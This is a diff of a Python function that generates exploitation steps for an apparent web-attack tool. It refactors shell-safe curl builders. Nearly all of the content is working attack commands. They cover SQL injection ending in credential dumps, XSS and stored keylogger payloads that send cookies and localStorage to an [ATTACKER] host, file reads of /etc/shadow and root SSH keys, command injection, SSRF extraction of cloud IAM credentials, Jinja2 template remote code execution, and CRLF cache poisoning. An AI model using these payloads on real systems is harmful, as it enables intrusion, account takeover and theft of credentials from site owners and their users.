@@ -2413,10 +2413,19 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
     target = test_url if test_url and test_url != "[TARGET]" else base_url
     path = ei.get("path", "")
     target_base = target.split("?")[0] if "?" in target else target
-    # Shell-safe versions for embedding in bash commands
-    _t = shlex.quote(target)
-    _tb = shlex.quote(target_base)
-    _bu = shlex.quote(base_url)
+
+    def _curl(url: str, extra: str = "") -> str:
+        """Build a shell-safe curl command."""
+        parts = [f"curl -s {sp}"]
+        if extra:
+            parts.append(extra)
+        parts.append(shlex.quote(url))
+        return " ".join(parts)
+
+    def _curl_param(val: str, extra: str = "") -> str:
+        """Build curl with param=val appended to target_base."""
+        return _curl(f"{target_base}?{param}={val}", extra)
+
     steps = []
 
     if etype == "sqli":
@@ -2434,52 +2443,49 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         _p_sleep = _q("' AND SLEEP(5)-- -")
         steps = [
             {"title": "Confirm injection (error-based)",
-             "command": f"curl -s {sp} {_t}",
+             "command": _curl(target),
              "note": "Look for SQL error messages in the response body"},
             {"title": "Detect DB engine",
              "command": (
-                 f"echo '--- MySQL/Maria ---' && "
-                 f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_ver)} && "
-                 f"echo '--- SQLite ---' && "
-                 f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_sqlite)}"
+                 f"echo '--- MySQL/Maria ---' && {_curl_param(_p_ver)} && "
+                 f"echo '--- SQLite ---' && {_curl_param(_p_sqlite)}"
              ),
              "note": "Version string identifies the backend engine"},
             {"title": "Find column count",
              "command": (
                  f"for i in $(seq 1 15); do "
                  f"CODE=$(curl -s -o /dev/null -w '%{{http_code}}' {sp} "
-                 f"{shlex.quote(target_base + '?' + param + '=')}$({shlex.quote(_p_orderby)}$i{shlex.quote(_p_tail)}); "
+                 f"{shlex.quote(target_base + '?' + param + '=' + _p_orderby)}\"$i\"{shlex.quote(_p_tail)}); "
                  f"echo \"ORDER BY $i -> HTTP $CODE\"; done"
              ),
              "note": "Last 200 = N columns. First error = N+1."},
             {"title": "UNION version extraction",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_ver)}",
+             "command": _curl_param(_p_ver),
              "note": "Confirms UNION. Shows DB version."},
             {"title": "Enumerate databases",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_dbs)}",
+             "command": _curl_param(_p_dbs),
              "warning": "Reads all database names"},
             {"title": "Enumerate tables",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_tbls)}",
+             "command": _curl_param(_p_tbls),
              "warning": "Lists every table in current database"},
             {"title": "Enumerate columns (users)",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_cols)}",
+             "command": _curl_param(_p_cols),
              "warning": "Maps user table structure"},
             {"title": "Dump credentials",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_dump)}",
+             "command": _curl_param(_p_dump),
              "warning": "Extracts username:password pairs",
              "risk": "HIGH"},
             {"title": "Blind boolean test",
              "command": (
-                 f"TRUE=$(curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_true)} | wc -c) && "
-                 f"FALSE=$(curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_false)} | wc -c) && "
+                 f"TRUE=$({_curl_param(_p_true)} | wc -c) && "
+                 f"FALSE=$({_curl_param(_p_false)} | wc -c) && "
                  f"echo \"TRUE=$TRUE FALSE=$FALSE\" && "
                  f"[ \"$TRUE\" != \"$FALSE\" ] && echo 'BLIND CONFIRMED' || echo 'Same size'"
              ),
              "note": "Automated true/false comparison"},
             {"title": "Time-based blind test",
              "command": (
-                 f"START=$(date +%s) && "
-                 f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + _p_sleep)} > /dev/null && "
+                 f"START=$(date +%s) && {_curl_param(_p_sleep)} > /dev/null && "
                  f"END=$(date +%s) && DIFF=$((END-START)) && "
                  f"echo \"Delay: ${{DIFF}}s\" && "
                  f"[ $DIFF -ge 4 ] && echo 'TIME-BASED CONFIRMED' || echo 'No delay'"
@@ -2534,26 +2540,26 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         _xp_full = quote("<script>fetch('[ATTACKER]/s',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href,ls:JSON.stringify(localStorage)})})</script>")
         steps = [
             {"title": "Check reflection (marker injection)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={marker}\" | grep -c '{marker}'",
+             "command": f"{_curl_param(marker)} | grep -c '{marker}'",
              "note": f"Count > 0 = input reflected. Marker: {marker}"},
             {"title": "Test script tag",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_script}\"",
+             "command": _curl_param(_xp_script),
              "note": "Check if <script> appears unescaped in response body"},
             {"title": "Test img onerror (filter bypass)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_img}\"",
+             "command": _curl_param(_xp_img),
              "note": "Bypasses script tag filters"},
             {"title": "Test svg/onload",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_svg}\"",
+             "command": _curl_param(_xp_svg),
              "note": "Bypasses img and script filters"},
             {"title": "Test attribute injection (no brackets)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_attr}\"",
+             "command": _curl_param(_xp_attr),
              "note": "Attribute injection — no angle brackets needed"},
             {"title": "Cookie exfiltration",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_cookie}\"",
+             "command": _curl_param(_xp_cookie),
              "warning": "Steals session cookies",
              "risk": "HIGH"},
             {"title": "Full session theft",
-             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_full}\"",
+             "command": _curl_param(_xp_full),
              "warning": "Exfiltrates cookies + localStorage + URL",
              "risk": "HIGH"},
             {"title": "Generate credential phishing page",
@@ -2583,26 +2589,19 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"fetch('https://[ATTACKER]/k?k='+e.key)}}&lt;/script&gt;\n</pre>\n"
             f"</body></html>"
         )
+        _sxss_cookie = quote("<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>")
+        _sxss_keylog = quote("<script>document.onkeypress=function(e){fetch('[ATTACKER]/k?k='+e.key)}</script>")
         steps = [
             {"title": "Inject persistent cookie-stealing payload",
-             "command": (
-                 f"curl -s {sp} -X POST -d \"{param}="
-                 f"<script>new Image().src='https://[ATTACKER]/c?c='+document.cookie</script>\" "
-                 f"\"{target}\""
-             ),
+             "command": _curl(target, f"-X POST --data-urlencode {shlex.quote(param + '=' + _sxss_cookie)}"),
              "warning": "Injects a persistent payload into the application"},
             {"title": "Inject persistent keylogger payload",
-             "command": (
-                 f"curl -s {sp} -X POST -d \"{param}="
-                 f"<script>document.onkeypress=function(e){{"
-                 f"fetch('https://[ATTACKER]/k?k='+e.key)}}</script>\" "
-                 f"\"{target}\""
-             ),
-             "warning": "Injects persistent keylogger — captures all keystrokes",
+             "command": _curl(target, f"-X POST --data-urlencode {shlex.quote(param + '=' + _sxss_keylog)}"),
+             "warning": "Injects persistent keylogger",
              "risk": "CRITICAL"},
             {"title": "Verify payload renders on target page",
-             "command": f"curl -s {sp} \"{base_url.rstrip('/')}{render}\" | grep -i 'ATTACKER\\|script'",
-             "note": "Check if the payload appears on the render page"},
+             "command": f"{_curl(base_url.rstrip('/') + render)} | grep -ic 'script'",
+             "note": "Count > 0 = payload persisted on the render page"},
             {"title": "Generate stored XSS attack documentation",
              "command": "(file will be generated automatically)",
              "generate_file": {
@@ -2637,34 +2636,33 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"   {target_base}?{param}=/var/log/apache2/access.log&amp;cmd=id</pre>\n"
             f"</body></html>"
         )
+        _trav = "../../../../../../"
         steps = [
             {"title": "Read /etc/passwd",
-             "command": f"curl -s {sp} \"{target}\"",
+             "command": _curl(target),
              "note": "Look for root:x:0:0: in output"},
-            {"title": "Read /etc/shadow (if readable)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=../../../../../../etc/shadow\"",
-             "warning": "Attempts to read password hashes",
-             "note": "Usually requires root — but misconfigurations happen"},
+            {"title": "Read /etc/shadow",
+             "command": _curl_param(quote(_trav + "etc/shadow")),
+             "warning": "Attempts to read password hashes"},
             {"title": "Read application config",
-             "command": f"curl -s {sp} \"{target_base}?{param}=../../../var/www/html/config.php\"",
+             "command": _curl_param(quote("../../../var/www/html/config.php")),
              "note": "Look for DB credentials, API keys, secrets"},
-            {"title": "Read source via PHP filter (base64)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=php://filter/convert.base64-encode/resource=index\" | base64 -d",
-             "note": "Decodes PHP source code — reveals application logic"},
-            {"title": "Read /proc/self/environ (env variables)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=/proc/self/environ\"",
-             "note": "May reveal API keys, DB passwords, AWS credentials",
+            {"title": "Read source via PHP filter",
+             "command": f"{_curl_param(quote('php://filter/convert.base64-encode/resource=index.php'))} | base64 -d 2>/dev/null",
+             "note": "Decodes PHP source code"},
+            {"title": "Read /proc/self/environ",
+             "command": _curl_param("/proc/self/environ"),
              "warning": "Reads process environment variables"},
             {"title": "Read SSH private key",
-             "command": f"curl -s {sp} \"{target_base}?{param}=../../../../../../root/.ssh/id_rsa\"",
+             "command": _curl_param(quote(_trav + "root/.ssh/id_rsa")),
              "warning": "Attempts to read server SSH key",
              "risk": "CRITICAL"},
-            {"title": "Attempt null byte bypass (legacy PHP)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=../../../../../../etc/passwd%00\"",
+            {"title": "Null byte bypass (legacy PHP)",
+             "command": _curl_param(quote(_trav + "etc/passwd") + "%00"),
              "note": "Null byte terminates appended extensions (PHP < 5.3.4)"},
-            {"title": "Attempt double encoding bypass",
-             "command": f"curl -s {sp} \"{target_base}?{param}=%252e%252e%252f%252e%252e%252fetc%252fpasswd\"",
-             "note": "Double URL encoding bypasses single-decode filters"},
+            {"title": "Double encoding bypass",
+             "command": _curl_param("%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
+             "note": "Bypasses single-decode WAF filters"},
             {"title": "Generate LFI payload reference",
              "command": "(file will be generated automatically)",
              "generate_file": {
@@ -2699,25 +2697,25 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Confirm command execution (id)",
-             "command": f"curl -s {sp} {_t}",
+             "command": _curl(target),
              "note": "Look for uid=, whoami result, or command output"},
             {"title": "Test semicolon separator",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';id'))}",
+             "command": _curl_param(quote(";id")),
              "note": "Unix command chain via semicolon"},
             {"title": "Test pipe separator",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote('|id'))}",
+             "command": _curl_param(quote("|id")),
              "note": "Pipe operator"},
             {"title": "Test $() subshell",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote('$(id)'))}",
+             "command": _curl_param(quote("$(id)")),
              "note": "POSIX subshell execution on server"},
             {"title": "Read /etc/passwd",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';cat /etc/passwd'))}",
+             "command": _curl_param(quote(";cat /etc/passwd")),
              "warning": "Reads system user file"},
             {"title": "Enumerate system info",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';uname -a;whoami;pwd'))}",
+             "command": _curl_param(quote(";uname -a;whoami;pwd")),
              "note": "Gathers OS, user, and directory info"},
             {"title": "Check for outbound connectivity",
-             "command": f"curl -s {sp} {shlex.quote(target_base + '?' + param + '=' + quote(';curl -s https://ifconfig.me'))}",
+             "command": _curl_param(quote(";curl -s https://ifconfig.me")),
              "note": "If output = IP, the server can make outbound requests (reverse shell possible)"},
             {"title": "Reverse shell setup (example — COMMENTED)",
              "command": (
@@ -2761,30 +2759,30 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Read cloud metadata (AWS IMDSv1)",
-             "command": f"curl -s {sp} \"{target}\"",
+             "command": _curl(target),
              "note": "Look for ami-id, instance-id, security-credentials"},
             {"title": "List IAM roles",
-             "command": f"curl -s {sp} \"{target_base}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
+             "command": _curl_param(quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/")),
              "warning": "Lists cloud IAM roles"},
             {"title": "Extract IAM credentials",
-             "command": f"curl -s {sp} \"{target_base}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]\"",
+             "command": _curl_param(quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]")),
              "warning": "Extracts cloud IAM credentials",
              "risk": "CRITICAL",
-             "note": "Replace [ROLE_NAME] with role from previous step"},
+             "note": "[ROLE_NAME] auto-filled from previous step output"},
             {"title": "Check GCP metadata",
-             "command": f"curl -s {sp} \"{target_base}?{param}=http://metadata.google.internal/computeMetadata/v1/instance/\"",
-             "note": "Requires Metadata-Flavor header — may fail via SSRF"},
+             "command": _curl_param(quote("http://metadata.google.internal/computeMetadata/v1/instance/")),
+             "note": "Requires Metadata-Flavor header — may fail via naive SSRF"},
             {"title": "Probe internal Redis (port 6379)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=http://127.0.0.1:6379/info\"",
+             "command": _curl_param(quote("http://127.0.0.1:6379/info")),
              "note": "Redis info — if present, can lead to RCE via SSRF"},
             {"title": "Probe internal Elasticsearch (port 9200)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=http://127.0.0.1:9200/_cat/indices\"",
+             "command": _curl_param(quote("http://127.0.0.1:9200/_cat/indices")),
              "note": "Lists all Elasticsearch indices"},
             {"title": "Scan internal network",
              "command": (
                  f"for ip in 127.0.0.1 192.168.1.1 10.0.0.1 172.16.0.1; do "
                  f"echo \"=== $ip ===\"; curl -s --max-time 3 {sp} "
-                 f"\"{target_base}?{param}=http://$ip/\" | head -3; done"
+                 f"{shlex.quote(target_base + '?' + param + '=')}\"http://$ip/\" | head -3; done"
              ),
              "note": "Scans common internal IPs for live services"},
             {"title": "Generate SSRF payload reference",
@@ -2812,22 +2810,27 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}}}</pre>\n"
             f"</body></html>"
         )
+        _ssti_49 = quote("{{7*7}}")
+        _ssti_el = quote("${7*7}")
+        _ssti_cls = quote("{{''.__class__.__mro__[1].__subclasses__()}}")
+        _ssti_rce_passwd = quote("{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}")
+        _ssti_rce_id = quote("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}")
         steps = [
             {"title": "Confirm template evaluation (7*7=49)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={{{{7*7}}}}\" | grep 49",
+             "command": f"{_curl_param(_ssti_49)} | grep 49",
              "note": "49 in response = server evaluated the expression"},
-            {"title": "Test alternative engine (${{7*7}})",
-             "command": f"curl -s {sp} \"{target_base}?{param}=${{7*7}}\"",
+            {"title": "Test alternative engine (${7*7})",
+             "command": _curl_param(_ssti_el),
              "note": "Tests Freemarker/Velocity/EL syntax"},
             {"title": "List Python classes (Jinja2)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={{{{''.__class__.__mro__[1].__subclasses__()}}}}\"",
+             "command": _curl_param(_ssti_cls),
              "note": "Lists available Python classes for RCE chain"},
             {"title": "Read /etc/passwd via os.popen (Jinja2)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={{{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}}}\"",
+             "command": _curl_param(_ssti_rce_passwd),
              "warning": "Reads /etc/passwd via template-based RCE",
              "risk": "CRITICAL"},
             {"title": "Execute OS command (Jinja2 — id)",
-             "command": f"curl -s {sp} \"{target_base}?{param}={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\"",
+             "command": _curl_param(_ssti_rce_id),
              "warning": "Executes OS commands on the server",
              "risk": "CRITICAL"},
             {"title": "Generate SSTI payload reference",
@@ -2880,12 +2883,12 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         steps = [
             {"title": "Check for CSRF token presence",
              "command": (
-                 f"curl -s {sp} \"{target}\" | "
+                 f"{_curl(target)} | "
                  f"grep -ioE '(csrf|_token|nonce|authenticity_token)[^\"]*\"[^\"]*\"' | head -5"
              ),
              "note": "No results = no CSRF protection = exploitable"},
             {"title": "Check SameSite cookie attribute",
-             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'set-cookie' | grep -i 'samesite'",
+             "command": f"{_curl(target, '-I')} | grep -i 'set-cookie' | grep -i 'samesite'",
              "note": "No SameSite or SameSite=None = cookies sent cross-origin"},
             {"title": "Generate auto-submit CSRF page",
              "command": "(file will be generated automatically)",
@@ -2904,7 +2907,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                          "then redirects victim to legit site after 2.5s.",
              }},
             {"title": "Verify action was performed",
-             "command": f"curl -s {sp} \"{target}\"",
+             "command": _curl(target),
              "note": "Compare response to pre-attack state"},
         ]
 
@@ -2922,27 +2925,28 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"5. Vertical: access admin endpoints with user token</pre>\n"
             f"</body></html>"
         )
+        _idor_base = shlex.quote(target_base + "?" + param + "=")
         steps = [
             {"title": "Enumerate accessible resources (IDs 1-20)",
              "command": (
                  f"for i in $(seq 1 20); do echo \"=== ID $i ===\"; "
-                 f"curl -s {sp} \"{target_base}?{param}=$i\" | head -3; echo; done"
+                 f"curl -s {sp} {_idor_base}\"$i\" | head -3; echo; done"
              ),
              "note": "Compare responses — different content per ID = confirmed IDOR"},
             {"title": "Compare response sizes across IDs",
              "command": (
                  f"for i in $(seq 1 20); do "
-                 f"SIZE=$(curl -s {sp} \"{target_base}?{param}=$i\" | wc -c); "
+                 f"SIZE=$(curl -s {sp} {_idor_base}\"$i\" | wc -c); "
                  f"echo \"ID $i: $SIZE bytes\"; done"
              ),
              "note": "Different sizes indicate different data — IDOR confirmed"},
             {"title": "Targeted extraction (specific ID)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=1\"",
-             "note": "Replace 1 with a target user's ID to access their data"},
+             "command": _curl_param("1"),
+             "note": "Replace 1 with a target user's ID"},
             {"title": "Test negative/zero IDs",
              "command": (
-                 f"echo '=== ID 0 ===' && curl -s {sp} \"{target_base}?{param}=0\" | head -3 && "
-                 f"echo '=== ID -1 ===' && curl -s {sp} \"{target_base}?{param}=-1\" | head -3"
+                 f"echo '=== ID 0 ===' && {_curl_param('0')} | head -3 && "
+                 f"echo '=== ID -1 ===' && {_curl_param('-1')} | head -3"
              ),
              "note": "Edge case IDs may reveal admin/system data"},
             {"title": "Generate IDOR enumeration documentation",
@@ -3006,7 +3010,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Verify missing X-Frame-Options / frame-ancestors",
-             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'x-frame-options\\|frame-ancestors'",
+             "command": f"{_curl(target, '-I')} | grep -i 'x-frame-options\\|frame-ancestors'",
              "note": "No output = frameable = clickjacking possible"},
             {"title": "Generate basic clickjacking exploit page",
              "command": "(file will be generated automatically)",
@@ -3076,13 +3080,13 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Verify CORS reflects arbitrary origin",
-             "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control'",
+             "command": f"{_curl(target, '-v -H \"Origin: https://evil.com\"')} 2>&1 | grep -i 'access-control'",
              "note": "Look for Access-Control-Allow-Origin: https://evil.com"},
             {"title": "Check if credentials are allowed",
-             "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control-allow-credentials'",
+             "command": f"{_curl(target, '-v -H \"Origin: https://evil.com\"')} 2>&1 | grep -i 'access-control-allow-credentials'",
              "note": "true = critical — authenticated data can be stolen cross-origin"},
             {"title": "Test null origin (sandbox bypass)",
-             "command": f"curl -v {sp} -H \"Origin: null\" \"{target}\" 2>&1 | grep -i 'access-control'",
+             "command": f"{_curl(target, '-v -H \"Origin: null\"')} 2>&1 | grep -i 'access-control'",
              "note": "Origin: null reflected = exploitable via sandboxed iframe"},
             {"title": "Generate CORS data theft page",
              "command": "(file will be generated automatically)",
@@ -3126,13 +3130,13 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Retrieve full CSP header",
-             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'content-security-policy'",
+             "command": f"{_curl(target, '-I')} | grep -i 'content-security-policy'",
              "note": "Analyze directives for weaknesses"},
             {"title": "Check for unsafe-inline",
-             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'unsafe-inline'",
+             "command": f"{_curl(target, '-I')} | grep -i 'unsafe-inline'",
              "note": "If present: direct <script> injection bypasses CSP"},
             {"title": "Check for unsafe-eval",
-             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'unsafe-eval'",
+             "command": f"{_curl(target, '-I')} | grep -i 'unsafe-eval'",
              "note": "If present: eval(), Function(), setTimeout with strings all work"},
             {"title": "Generate CSP bypass reference",
              "command": "(file will be generated automatically)",
@@ -3161,16 +3165,16 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Inject HTTP header (Set-Cookie)",
-             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aSet-Cookie:%20session=hijacked\"",
+             "command": _curl_param("%0d%0aSet-Cookie:%20session=hijacked", "-v"),
              "note": "Check response headers for injected Set-Cookie"},
             {"title": "Inject Location header (redirect)",
-             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aLocation:%20https://evil.com\"",
+             "command": _curl_param("%0d%0aLocation:%20https://evil.com", "-v"),
              "note": "Check if response contains injected Location header"},
             {"title": "Response splitting (XSS)",
-             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0a%0d%0a<script>alert(1)</script>\"",
+             "command": _curl_param("%0d%0a%0d%0a" + quote("<script>alert(1)</script>"), "-v"),
              "warning": "HTTP response splitting for XSS"},
             {"title": "Cache poisoning attempt",
-             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aX-Forwarded-Host:%20evil.com\"",
+             "command": _curl_param("%0d%0aX-Forwarded-Host:%20evil.com", "-v"),
              "note": "If cached, subsequent users get poisoned response",
              "warning": "May affect other users of the target"},
             {"title": "Generate CRLF payload reference",
@@ -3202,18 +3206,19 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"<p>3. Victim trusts the URL (starts with legit domain)</p>\n"
             f"</body></html>"
         )
+        _host = base_url.split("//")[1].split("/")[0] if "//" in base_url else "target.com"
         steps = [
             {"title": "Confirm redirect to external domain",
-             "command": f"curl -v {sp} \"{target}\" 2>&1 | grep -i 'location'",
+             "command": f"{_curl(target, '-v')} 2>&1 | grep -i 'location'",
              "note": "Location header should point to evil domain"},
             {"title": "Test double-slash bypass",
-             "command": f"curl -v {sp} \"{target_base}?{param}=//evil.com\" 2>&1 | grep -i 'location'",
+             "command": f"{_curl_param(quote('//evil.com'), '-v')} 2>&1 | grep -i 'location'",
              "note": "Protocol-relative redirect bypasses some scheme checks"},
             {"title": "Test @ symbol bypass",
-             "command": f"curl -v {sp} \"{target_base}?{param}=https://{base_url.split('//')[1] if '//' in base_url else 'target.com'}@evil.com\" 2>&1 | grep -i 'location'",
+             "command": f"{_curl_param(quote('https://' + _host + '@evil.com'), '-v')} 2>&1 | grep -i 'location'",
              "note": "URL with @ may bypass domain validation"},
             {"title": "Test URL-encoded payload",
-             "command": f"curl -v {sp} \"{target_base}?{param}=%68%74%74%70%73%3a%2f%2fevil.com\" 2>&1 | grep -i 'location'",
+             "command": f"{_curl_param('%68%74%74%70%73%3a%2f%2fevil.com', '-v')} 2>&1 | grep -i 'location'",
              "note": "URL-encoded redirect may bypass input filters"},
             {"title": "Generate open redirect reference",
              "command": "(file will be generated automatically)",
